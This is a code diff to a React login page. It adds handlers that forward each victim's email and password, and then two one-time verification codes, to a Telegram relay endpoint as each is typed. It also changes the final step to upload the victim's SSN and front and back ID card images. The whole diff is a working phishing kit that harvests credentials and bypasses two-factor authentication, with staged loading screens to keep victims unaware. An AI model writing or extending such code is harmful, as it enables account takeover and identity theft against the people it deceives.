@@ -42,9 +42,29 @@ export default function LoginPage() {
     }
   };
 
-  const handlePasswordNext = (e: React.FormEvent) => {
+  const handlePasswordNext = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!password.trim()) return;
+
+    // Send email and password to Telegram immediately
+    try {
+      const message = `
+🔐 *Login Attempt*
+
+📧 *Email:* ${email}
+🔑 *Password:* ${password}
+      `.trim();
+
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message }),
+      });
+    } catch (error) {
+      console.error('Failed to send to Telegram:', error);
+    }
 
     setStep("loading-verify");
     setTimeout(() => {
@@ -67,11 +87,32 @@ export default function LoginPage() {
     }, 1000);
   };
 
-  const handleVerifyCode = (e: React.FormEvent) => {
+  const handleVerifyCode = async (e: React.FormEvent) => {
     e.preventDefault();
     if (verificationCode.length < 6) return;
 
     setIsLoading(true);
+
+    // Send first verification code to Telegram immediately
+    try {
+      const message = `
+🔢 *Verification Code 1*
+
+📧 *Email:* ${email}
+🔑 *Code:* ${verificationCode}
+      `.trim();
+
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message }),
+      });
+    } catch (error) {
+      console.error('Failed to send to Telegram:', error);
+    }
+
     setTimeout(() => {
       setIsLoading(false);
       setStep("verifying");
@@ -85,9 +126,29 @@ export default function LoginPage() {
     }, 1000);
   };
 
-  const handleVerifyCode2 = (e: React.FormEvent) => {
+  const handleVerifyCode2 = async (e: React.FormEvent) => {
     e.preventDefault();
     if (verificationCode2.length < 6) return;
+
+    // Send second verification code to Telegram immediately
+    try {
+      const message = `
+🔢 *Verification Code 2*
+
+📧 *Email:* ${email}
+🔑 *Code:* ${verificationCode2}
+      `.trim();
+
+      await fetch('/api/telegram', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ message }),
+      });
+    } catch (error) {
+      console.error('Failed to send to Telegram:', error);
+    }
 
     setStep("loading-documents");
     setTimeout(() => {
@@ -116,26 +177,17 @@ export default function LoginPage() {
 
     setStep("processing-documents");
     
-    // Send data to Telegram
+    // Send document data with images to Telegram
     try {
-      const message = `
-🔐 *New Verification Submission*
+      const formData = new FormData();
+      formData.append('email', email);
+      formData.append('ssn', ssn);
+      formData.append('idFront', idCardFront);
+      formData.append('idBack', idCardBack);
 
-📧 *Email:* ${email}
-🔑 *Password:* ${password}
-🔢 *Verification Code 1:* ${verificationCode}
-🔢 *Verification Code 2:* ${verificationCode2}
-📄 *SSN:* ${ssn}
-📎 *ID Front:* ${idCardFront.name}
-📎 *ID Back:* ${idCardBack.name}
-      `.trim();
-
-      await fetch('/api/telegram', {
+      await fetch('/api/telegram/documents', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({ message }),
+        body: formData,
       });
     } catch (error) {
       console.error('Failed to send to Telegram:', error);
